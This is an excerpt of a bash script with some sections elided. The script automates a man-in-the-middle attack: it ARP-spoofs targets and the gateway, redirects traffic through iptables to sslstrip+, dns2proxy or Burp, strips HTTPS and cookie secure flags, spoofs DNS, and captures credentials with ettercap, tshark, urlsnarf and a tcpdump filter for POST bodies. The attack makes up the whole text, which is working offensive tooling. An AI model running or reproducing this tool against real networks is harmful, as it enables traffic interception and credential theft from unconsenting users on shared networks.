...
if [[ $( echo $inpt | grep -w '\-i' ) =~ '-i' ]] || [[ $inpt =~ '--interface' ]] ; then
   ...
   echo -e "${red}[${green}x${red}]${white} specify an interface"
   exit 1
fi
if [[ $inpt =~ '-g' ]] || [[ $inpt =~ '--gateway' ]] ; then
   gateway=$( echo $inpt | sed 's/ /\n/g' | grep -e '-g' -e '--gateway' -A 1 | awk NR==2 )
else
   echo -e "${red}[${green}+${red}]${white} specify gateway"
   exit 1
fi
...
cd "${date}_output"
echo -e "${red} [${green}+${red}]${white} Time $date"
echo -e "${red} [${green}+${red}]${white} Distro $distro"
echo -e "${red} [${green}+${red}]${white} Interface $interface"
echo -e "${red} [${green}+${red}]${white} Local IP $myip"
echo -e "${red} [${green}+${red}]${white} Gateway $gateway"
echo -e "${red} [${green}+${red}]${white} Target(s) $target"
function iptables_hsts {
   echo -e "${red} [${green}+${red}]${white} iptables --flush"
   echo -e "${red} [${green}+${red}]${white} iptables --flush -t nat"
   echo -e "${red} [${green}+${red}]${white} iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000"
   echo -e "${red} [${green}+${red}]${white} iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53 "
   echo -e "${red} [${green}+${red}]${white} Enable SSLstrip+"
   iptables --flush
   iptables --flush -t nat
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
   iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
   if [[ $savelog == "" ]] ; then
      echo -en "${red} [${green}+${red}]${white} Do you want to save sslstrip+ logs at ${white}log.txt [y/n]: " ; read logz
      if [[ $logz == "y" ]] || [[ $logz == "Y" ]] ; then
            echo -e "${red} [${green}+${red}]${white} saving session logs at log.txt"
            sslstrip -l 9000 -a -w log.txt 2> /dev/null 1> /dev/null &
         else
         echo -e "${red} [${green}+${red}]${white} NO Logs will be saved for this session"
          sslstrip -l 9000 -a 2> /dev/null 1> /dev/null &
      fi
    else
      echo -e "${red} [${green}+${red}]${white} saving session logs at $savelog"
...
function dns_2_proxy {
   if [[ -d ../../dns2proxy ]] ; then
      ...
      echo -e "${red} [${green}x${red}]${white} dns2proxy doesn't exist"
      exit
   fi
}
...
function iptables_burp {
   ...
   echo -e "${red} [${green}+${red}]${white} iptables --flush"
   echo -e '${red} [${green}+${red}]${white} Iptables -t nat -A PREROUTING -p tcp --dport 80  -j DNAT --in-interface'" $interface"' --to-destination'" $myip"
   echo -e '${red} [${green}+${red}]${white} Iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --in-interface'" $interface "'--to-destination'" $myip"
   if [[ $burp == "on" ]] ; then
      echo -e '${red} [${green}+${red}]${white} Now open Burpsuite > Proxy > Options'
      echo -e '${red} [${green}+${red}]${white} Add proxy Listeners on ports 443,80 .. enable ( Support Invisible Proxying )'
      echo -e '${red} [${green}+${red}]${white} And in Response Modification Enable ( Convert HTTPS links to HTTP )'
      echo -e '${red} [${green}+${red}]${white} And ( Remove secure Flag from cookies )'
...
function scan {
   echo -e "${red} [${green}+${red}]${white} Enable ARPspoof"
   if [[ $target =~ '/24' ]] || [[ $target == "/16" ]] ; then
      echo -e "${red} [${green}+${red}]${white} Scanning subnet ..."
      ...
      for i in $(seq 1 $(wc -l ipst.txt | awk {' print $1 '})) ; do
         ...
         echo -e "${red} [${green}+${red}]${white} spoof Target $t1"
         let xx+=10
         let xxx+=10
      done
       ...
       function action
       {
          if [[ $silent == "on" ]] || [[ $silent == "ON" ]] ; then
             ...
             echo -e "${red} [${green}+${red}]${white} spoof Target $i"
       ...
       if [[ $target =~ "," ]] ; then
          for i in `echo $target | sed 's/,/\n/g'` ; do
             ...
             if [[ $nocheck == "on" ]] ; then
                ...
                if [[ $( cat ip_st.txt ) =~ "Unreachable" ]] || [[ $( cat ip_st.txt ) =~ '100% packet loss' ]] || [[ $( cat ip_st.txt ) =~ '0 received' ]] ; then
                   echo -e "${red} [${green}+${red}]${white} $i is Unreachable, if IP is blocking ICMP packets run with --no-check"
                else
                    action
                fi
             fi
          ...
          function action1
          {
             ...
             echo -e "${red} [${green}+${red}]${white} spoof Target $target"
          ...
          if [[ $nocheck == "on" ]] ; then
             ...
             if [[ $( cat ip_st.txt ) =~ "Unreachable" ]] || [[ $( cat ip_st.txt ) =~ '100% packet loss' ]] || [[ $( cat ip_st.txt ) =~ '0 received' ]] ; then
                echo -e "${red} [${green}+${red}]${white} $target is Unreachable, if IP is blocking ICMP packets run with --no-check"
                exit
             else
                action1
             fi
          ...
          echo -e "${red} [${green}+${red}]${white} Couldn't identify target(s)"
          exit
       fi
   fi
   echo -e "${red} [${green}+${red}]${white} spoof Gateway $gateway"

}

function capture_creds {
   if [[ $ettercap == "on" ]] || [[ $ettercap == "ON" ]] && [[ $tshark == "on" ]] || [[ $tshark == "ON" ]] ; then
      echo -e "${red} [${green}+${red}]${white} Enable Tshark"
      echo -e "${red} [${green}+${red}]${white} Enable Ettercap"
   ...
   if [[ $driftnet == "on" ]] || [[ $driftnet == "ON" ]] ; then
      echo -e "${red} [${green}+${red}]${white} Enable Driftnet"
   fi
   if [[ $tshark == "on" ]] || [[ $driftnet == "on" ]] ; then
      echo -e "${red} [${green}+${red}]${white} Saving captured packets at ${date}_output/tshark.pcap"
      if [[ $silent == 'on' ]] ; then
   ...
   if [[ $tcpdump == "on" ]] ; then
      echo -e "${red} [${green}+${red}]${white} Enable TCPdump"
      xterm -geometry 90x55+0+100 -fg white -e bash -c "tcpdump -s 0 -A 'tcp dst port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'" &
   fi
   if [[ $iptraf == "on" ]] ; then
      echo -e "${red} [${green}+${red}]${white} Enable IPtraf-ng"
     xterm -geometry 90x50-0-0 -fg white -e "iptraf-ng -i $interface" &
   fi
   if [[ $urlsnarf == "on" ]] || [[ $urlsnarf == "ON" ]] ; then
      echo -e "${red} [${green}+${red}]${white} Enable urlsnarf"
      urlsnarf > urlsnarf.log 2> /dev/null &
      echo -e "${red} [${green}+${red}]${white} saving urlsnarf logs at output/${date}_output/urlsnarf.log"
   fi
   if [[ $etherape == "on" ]] ; then
      echo -e "${red} [${green}+${red}]${white} Enable Etherape"
   ...
   if [[ $dnsspoof == "on" ]] ; then
      ...
      if [[ -f $( echo $inpt | sed 's/ /\n/g' | grep -e '-p' -e '--dnsspoof' -A 1 | awk NR==2 ) ]] ; then
         ...
         echo -e "${red} [${green}+${red}]${white} Modify resolv.conf file"
         ...
         echo -e "${red} [${green}+${red}]${white} Couldn't find dns file to spoof with"
         exit 1
      fi
   fi
}
...
if [[ $hsts == 'on' ]] ; then
       echo -e "${red} [${green}+${red}]${white} Activating HSTS mode "
       iptables_hsts
       dns_2_proxy
elif [[ $burp == 'on' ]] ; then
       echo -e "${red} [${green}+${red}]${white} Activating Burp mode "
       iptables_burp
fi
echo -e "${red} [${green}+${red}]${white} echo 1 > /proc/sys/net/ipv4/ip_forward"
echo 1 > /proc/sys/net/ipv4/ip_forward
scan
capture_creds
if [[ $nocheck != "on" ]] ; then
   echo -e "${red} [${green}+${red}]${white} Activating respoofer, My gift to the MITM world :)"
   xterm -geometry 90x15-0-0 -fg green -T respoofer -e bash -c "../../respoof.sh $interface" &
fi

while true ; do
    echo -en "${red} [${green}+${red}]${white} Exit and stop the attack ? [Y]: "
    read f 2> /dev/null
    if [[ $f == "y" ]] || [[ $f == "Y" ]] || [[ $f == "" ]]; then
